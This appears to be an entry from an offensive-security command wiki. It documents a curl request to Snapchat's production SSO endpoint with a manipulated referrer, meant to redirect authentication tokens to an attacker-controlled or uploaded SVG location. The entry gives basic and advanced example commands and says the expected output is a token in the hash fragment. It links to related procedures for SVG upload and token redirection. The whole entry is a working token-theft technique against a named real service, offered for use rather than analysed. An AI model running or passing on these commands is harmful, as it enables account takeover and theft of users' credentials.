---
data: >-
  curl
  'https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=<crafted_url>'
tags:
  - web
  - request
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: d1ae07da-a539-430b-8535-e379dfb379d3
created_at: '2025-12-13T09:01:26.642Z'
updated_at: '2025-12-13T09:01:26.642Z'
verified: false
validated: true
submitted: true
---
# Curl SSO Request

## Command

```bash
curl 'https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=<crafted_url>'
```

## Description

Sends a request to Snapchat's SSO endpoint with a manipulated referrer to fetch or redirect tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `client_id` | SSO client identifier | Yes |
| `referrer` | URL to manipulate for redirect | Yes |

## Examples

### Basic Usage

```bash
curl 'https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https://example.com'
```

### Advanced Usage

```bash
curl -v 'https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/api/v1/media/file.svg?%23hash'
```

## Expected Output

Redirect response with token in hash fragment.

## Related

- [[commands/curl-upload-svg]]
- [[procedures/Manipulate-Referrer-for-Token-Redirection]]
